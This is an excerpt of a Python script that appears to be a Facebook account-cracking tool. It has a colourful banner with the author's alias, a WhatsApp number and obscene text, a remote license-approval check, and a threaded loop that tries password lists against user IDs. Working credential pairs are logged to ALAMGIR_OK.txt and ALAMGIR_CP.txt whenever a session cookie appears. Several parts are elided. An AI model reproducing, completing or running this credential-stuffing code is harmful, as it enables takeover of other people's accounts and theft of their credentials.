...
from concurrent.futures import ThreadPoolExecutor as alamgirssb
...
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m FUCK BOY alamgir           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +01712034653        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  01712034653           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGroup Fb  :  \033[1;92m PRIYA I FUCK YOU\033[1;31;1m █
...
a=requests.get("https://github.com/cyberattack07/approval.txt/blob/main/approval.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mALAMGIR_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mALAMGIR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back ALAMGIR Menu ")
	    alamgir()
...
def alamgir():
    ...
    print(yellow +' [0] EXIT')
    print('')
    _alamgir___ = input(yellow+' [*] Choose option : ')
    if _alamgir___ in ('1', '01'):
        __xxx__().alamgirx(id)
    if _alamgir___ in ('2', '02'):
    	os.system("python filemake.py")
    if _alamgir___ in ('E', 'ee'):
        pass
...
class __xxx__:
    def __init__(self):
        self.id = []
    def alamgirx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input(green+'Put File Name : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[ALAMGIR-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [ALAMGIR-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ALAMGIR_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
            with alamgirssb(max_workers=30) as ssbworld:
